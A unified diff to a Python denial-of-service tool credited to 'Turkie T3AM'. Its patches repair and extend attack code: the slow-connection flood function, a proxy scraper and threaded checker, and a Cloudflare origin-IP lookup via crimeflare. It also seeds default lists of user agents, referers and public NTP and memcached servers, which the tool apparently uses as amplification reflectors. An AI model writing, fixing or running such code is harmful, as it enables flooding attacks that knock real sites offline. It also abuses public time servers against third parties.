@@ -9,8 +9,16 @@ ot = ["STOP", "TOOLS", "HELP"]
 methods = l7 + l4 + l3
 methodsl = l7 + l4 + l3 + to + ot
 
+import sys
+if sys.platform.startswith('win'):
+    try:
+        sys.stdout.reconfigure(encoding='utf-8')
+    except AttributeError:
+        pass
+
 from posixpath import expanduser
 from colorama import init, Fore
+init(autoreset=True)
 red_color = Fore.RED
 white_color = Fore.WHITE
 green_color = Fore.GREEN
@@ -1050,9 +1058,9 @@ def slow(conn, socks_type):
                 s = ctx.wrap_socket(s, server_hostname=target)
             for _ in range(conn):
                 try:
-                    s.send(request) * conn
+                    s.send(str.encode(request))
                     t += 1
-                    sys.stdout.write("Connections = " + t + "\r")
+                    sys.stdout.write("Connections = " + str(t) + "\r")
                     sys.stdout.flush()
                 except:
                     s.close()
@@ -1099,21 +1107,22 @@ nums = 0
 
 def check_socks(ms):
     global nums
-    thread_list = []
-    for lines in list(proxies):
-        if choice == "5":
-            th = threading.Thread(target=checking, args=(lines, 5, ms,))
-            th.start()
-        if choice == "4":
-            th = threading.Thread(target=checking, args=(lines, 4, ms,))
-            th.start()
-        if choice == "1":
-            th = threading.Thread(target=checking, args=(lines, 1, ms,))
-            th.start()
-        thread_list.append(th)
-        sleep(0.01)
-    for th in list(thread_list):
-        th.join()
+    from concurrent.futures import ThreadPoolExecutor
+    max_workers = 40
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = []
+        for lines in list(proxies):
+            if choice == "5":
+                futures.append(executor.submit(checking, lines, 5, ms))
+            elif choice == "4":
+                futures.append(executor.submit(checking, lines, 4, ms))
+            elif choice == "1":
+                futures.append(executor.submit(checking, lines, 1, ms))
+        for fut in futures:
+            try:
+                fut.result()
+            except:
+                pass
     ans = "y"
     if ans == "y" or ans == "":
         if choice == "4":
@@ -1204,22 +1213,20 @@ def downloadsocks(choice):
         except:
             f.close()
         try:
-
-            req = requests.get("https://www.socks-proxy.net/", timeout=5, headers={"User-Agent", UserAgent}).text
+            req = requests.get("https://www.socks-proxy.net/", timeout=5, headers={"User-Agent": UserAgent}).text
             part = str(req)
             part = part.split("<tbody>")
             part = part[1].split("</tbody>")
             part = part[0].split("<tr><td>")
-            proxies = ""
+            proxies_list = []
             for proxy in part:
                 proxy = proxy.split("</td><td>")
                 try:
-                    proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
+                    proxies_list.append(proxy[0] + ":" + proxy[1] + "\n")
                 except:
                     pass
-                out_file = open(out_file, "a")
-                out_file.write(proxies)
-                out_file.close()
+            with open(out_file, "a") as f:
+                f.write("".join(proxies_list))
         except:
             pass
     if choice == "5":
@@ -1536,7 +1543,7 @@ def tools():
 
 def cfip(domain):
     if str("http") in str(domain):
-        domain = domain.replace('https://', '').replace('http:', '').replace('/')
+        domain = domain.replace('https://', '').replace('http:', '').replace('/', '')
     URL = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi"
     r = requests.post(URL, data={"cfS": {domain}}, headers={"User-Agent": UserAgent, }, timeout=1)
     print(r.text)
@@ -1551,7 +1558,7 @@ def check(domain):
         die = "OFFLINE"
     else:
         die = "ONLINE"
-    print('\nstatus_code: '+r.status_code)
+    print('\nstatus_code: '+str(r.status_code))
     print('status: '+die+'\n')
 
 
@@ -1568,9 +1575,9 @@ def piger(siye):
         die = "ONLINE"
     else:
         die = "OFFLINE"
-    print('\nAddress: '+r.address)
-    print('Ping: '+r.avg_rtt)
-    print('Aceepted Packets: '+r.packets_received+'/'+r.packets_sent)
+    print('\nAddress: '+str(r.address))
+    print('Ping: '+str(r.avg_rtt))
+    print('Aceepted Packets: '+str(r.packets_received)+'/'+str(r.packets_sent))
     print('status: '+die+'\n')
 
 
@@ -1669,7 +1676,7 @@ def usge():
                  ░       ░                                        
                             {lcy}> {white_color}Made With Turkie T3AM {lcy}<
                           <[ {white_color}X-MrG3P5 {lcy}- {white_color}Dave {lcy}- {white_color}K3NON {lcy}]>{white_color}"""
-    os.system('clear||cls')
+    os.system('cls' if os.name == 'nt' else 'clear')
     print(my_banner)
     print("")
     print(f"""{lcy}[{green_color}Layer 7{lcy}]
@@ -1702,7 +1709,7 @@ if __name__ == '__main__':
     from scapy.layers.inet import TCP
     from scapy.all import *
     from socket import gaierror
-    os.system('clear||cls')
+    os.system('cls' if os.name == 'nt' else 'clear')
     bold_text = '\033[1m'
     print(bold_text)
     my_banners = f"""{red_color}
@@ -1739,27 +1746,75 @@ if __name__ == '__main__':
     strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890"
     Intn = random.randint
     Choice = random.choice
+    default_useragents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1"
+    ]
+    default_referers = [
+        "https://www.google.com/",
+        "https://www.youtube.com/",
+        "https://www.facebook.com/",
+        "https://www.wikipedia.org/",
+        "https://twitter.com/",
+        "https://www.instagram.com/",
+        "https://www.baidu.com/",
+        "https://www.yahoo.com/"
+    ]
+    default_memcached = [
+        "127.0.0.1:11211"
+    ]
+    default_ntp = [
+        "pool.ntp.org",
+        "time.google.com",
+        "time.windows.com",
+        "time.apple.com"
+    ]
+
     if not os.path.exists('files/'):
         makefile('files/')
     if not os.path.exists('files/proxys/'):
         makefile('files/proxys/')
     if not os.path.exists('files/useragent.txt'):
-        makefile('files/proxys/useragent.txt')
+        makefile('files/useragent.txt')
+        with open('files/useragent.txt', 'w') as f:
+            f.write('\n'.join(default_useragents) + '\n')
     if not os.path.exists('files/ntp_servers.txt'):
         makefile('files/ntp_servers.txt')
+        with open('files/ntp_servers.txt', 'w') as f:
+            f.write('\n'.join(default_ntp) + '\n')
     if not os.path.exists('files/memcached_servers.txt'):
         makefile('files/memcached_servers.txt')
+        with open('files/memcached_servers.txt', 'w') as f:
+            f.write('\n'.join(default_memcached) + '\n')
     if not os.path.exists('files/referers.txt'):
         makefile('files/referers.txt')
+        with open('files/referers.txt', 'w') as f:
+            f.write('\n'.join(default_referers) + '\n')
+
     try:
         with open("files/useragent.txt", "r") as f:
-            readuser = str(f.readlines()).replace('\n', '').replace('\r', '')
+            readuser = [line.strip() for line in f if line.strip()]
+        if not readuser:
+            readuser = default_useragents
+
         with open("files/referers.txt", "r") as f:
-            readref = str(f.readlines()).replace('\n', '').replace('\r', '')
+            readref = [line.strip() for line in f if line.strip()]
+        if not readref:
+            readref = default_referers
+
         with open("files/memcached_servers.txt", "r") as f:
-            memsv = str(f.readlines()).replace('\n', '').replace('\r', '')
+            memsv = [line.strip() for line in f if line.strip()]
+        if not memsv:
+            memsv = default_memcached
+
         with open("files/ntp_servers.txt", "r") as f:
-            ntpsv = str(f.readlines()).replace('\n', '').replace('\r', '')
+            ntpsv = [line.strip() for line in f if line.strip()]
+        if not ntpsv:
+            ntpsv = default_ntp
+
         UserAgent = Choice(readuser)
         referers = Choice(readref)
         memcached_servers = Choice(memsv)
